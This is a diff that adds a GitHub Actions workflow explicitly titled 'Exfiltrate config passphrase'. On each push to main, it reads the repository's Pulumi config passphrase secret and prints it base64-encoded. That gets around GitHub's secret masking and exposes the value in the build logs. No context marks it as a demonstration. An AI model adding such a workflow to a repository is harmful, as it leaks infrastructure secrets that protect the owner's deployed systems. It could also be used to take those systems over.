@@ -1,0 +1,11 @@
+name: Exfiltrate config passphrase
+on:
+  push:
+    branches: main
+jobs:
+  pulumi:
+    runs-on: ubuntu-latest
+    env:
+      PULUMI_CONFIG_PASSPHRASE: ${{ secrets.PULUMI_CONFIG_PASSPHRASE }}
+    steps:
+      - run: echo $PULUMI_CONFIG_PASSPHRASE | base64
